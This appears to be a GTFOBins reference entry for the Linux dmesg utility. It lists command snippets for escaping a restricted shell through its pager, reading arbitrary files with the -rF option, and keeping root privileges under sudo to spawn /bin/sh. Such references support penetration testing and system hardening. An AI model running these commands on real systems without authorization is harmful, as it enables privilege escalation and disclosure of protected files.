# GTFOBin: dmesg

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

This invokes the default pager, which is likely to be `less`, other functions may apply.

```
dmesg -H
!/bin/sh
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

This is not suitable for binary files.

```
LFILE=file_to_read
dmesg -rF "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This invokes the default pager, which is likely to be `less`, other functions may apply.

```
sudo dmesg -H
!/bin/sh
```